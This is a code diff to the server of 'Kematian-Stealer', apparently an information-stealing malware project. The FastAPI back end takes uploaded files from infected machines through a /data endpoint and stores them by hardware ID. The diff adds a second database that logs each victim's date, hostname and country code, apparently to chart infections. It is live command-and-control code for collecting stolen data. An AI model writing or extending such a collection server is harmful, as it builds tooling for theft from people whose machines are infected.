@@ -36,11 +36,11 @@ app.add_exception_handler(RateLimitExceeded, _rate_limit_exceeded_handler)
 good_dir = os.getenv("APPDATA")
 
 file_handler = MakeFiles()
-if not os.path.exists(os.path.join(good_dir, "Kematian-Stealer")):
-    file_handler.make_all()
+file_handler.ensure_all_dirs()
 
 
 db_path = os.path.join(good_dir, "Kematian-Stealer", "kdot.db")
+db_path_graphs = os.path.join(good_dir, "Kematian-Stealer", "graphs.db")
 
 api_base_url = "https://sped.lol"
 
@@ -55,7 +55,7 @@ hwid = lines[2].strip()
 NOTIFICATIONS = Notifications()
 
 
-async def initialize_database():
+async def initialize_database_logs():
     """Initialize the database if it doesn't exist."""
     async with aiosqlite.connect(db_path) as db:
         await db.execute(
@@ -74,10 +74,27 @@ async def initialize_database():
         await db.commit()
 
 
+async def initialize_database_graphs():
+    """Initialize the database if it doesn't exist."""
+    async with aiosqlite.connect(db_path_graphs) as db:
+        await db.execute(
+            """
+            CREATE TABLE IF NOT EXISTS graphs (
+                id INTEGER PRIMARY KEY AUTOINCREMENT,
+                date TEXT,
+                hostname TEXT,
+                country_code TEXT
+            )
+        """
+        )
+        await db.commit()
+
+
 @app.on_event("startup")
 async def on_startup():
     """Startup event to initialize the database."""
-    await initialize_database()
+    await initialize_database_logs()
+    await initialize_database_graphs()
 
 
 @app.post("/data")
@@ -117,6 +134,20 @@ async def receive_data(request: Request, file: UploadFile = File(...)) -> JSONRe
                 info["date"],
                 info["timezone"],
                 os.path.join(handler.HWID_folder_dir, custom_path),
+            ),
+        )
+        await db.commit()
+
+    async with aiosqlite.connect(db_path_graphs) as db:
+        await db.execute(
+            """
+            INSERT INTO graphs (date, hostname, country_code) 
+            VALUES (?, ?, ?)
+            """,
+            (
+                info["date"],
+                info["hostname"],
+                info["country_code"],
             ),
         )
         await db.commit()
